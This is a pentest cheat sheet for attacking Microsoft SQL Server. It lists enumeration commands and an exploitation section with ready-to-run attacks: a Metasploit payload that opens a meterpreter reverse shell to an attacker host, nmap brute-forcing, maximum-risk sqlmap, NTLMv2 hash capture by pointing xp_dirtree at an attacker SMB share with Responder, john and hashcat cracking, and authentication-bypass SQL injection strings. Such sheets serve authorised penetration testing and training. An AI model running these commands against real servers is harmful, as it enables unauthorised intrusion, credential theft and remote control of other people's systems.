# SQL

## Enumeration

### Metasploit

##### mssql_ping
```bash
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS [IP]
set RPORT 1433
run
```

##### mssql_enum
```bash
use auxiliary/scanner/mssql/mssql_enum
set RHOSTS [IP]
set RPORT 1433
run
```

### Nmap

##### nmap (SQL Server version detection)
```bash
nmap -p 1433 --script=ms-sql-info [IP]
```

##### nmap (SQL Server brute-force)
```bash
nmap -p 1433 --script=ms-sql-brute [IP]
```

##### nmap (SQL Server OS Fingerprint)
```bash
nmap -p 1433 --script=ms-sql-os-fingerprint [IP]
```

### sqlcmd

##### sqlcmd (Check SQL Server connection)
```bash
sqlcmd -S [IP],1433 -U [username] -P [password]
```

### Enum4Linux

##### enum4linux (Check for MSSQL Server)
```bash
enum4linux -S [IP]
```

### SQLPing

##### sqlping (Ping SQL Server)
```bash
sqlping [IP]
```

### SQSH

##### sqsh (Connect to SQL Server)
```bash
sqsh -S [IP] -U [USER]
```


---
---


## Exploitation

### Metasploit

##### mssql_payload
```bash
use exploit/windows/mssql/mssql_payload
set RHOSTS [IP]
set RPORT 1433
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```

##### mssql_sql_attack
```bash
use exploit/windows/mssql/mssql_sql_attack
set RHOSTS [IP]
set RPORT 1433
set SQLINJECTION [payload]
run
```

### Nmap

##### nmap (SQL Server brute-force login)
```bash
nmap -p 1433 --script=ms-sql-brute --script-args userdb=[userlist],passdb=[passlist] [IP]
```

### sqlmap

##### sqlmap (SQL Injection attack)
```bash
sqlmap -u http://[IP]/[path] --risk=3 --level=5 --threads=10 --dbs
```

### Windows Auth Hash
-  Setup Attacker Share
```sh
sudo impacket-smbserver [SHARE] /mnt/[Share]
```

- Start Responder
```sh
sudo responder -I tun0
```

- Send NTLMv2 Hash
```sh
xp_dirtree "\\[IP]\[SHARE]"
```

##### Crack NTLMv2:
```sh
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
```sh
hashcat -m 5600 -a 3 hashes.txt
```

### SQL Injection

##### Line Comments
```sh
admin' or '1'='1
```
```sh
' or '1'='1'-- -
```
```sh
' or 1=1 -- -
```
```sh
' or 1=1#
```
```sh
admin" --
```
```sh
admin" #
```
```sh
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
```

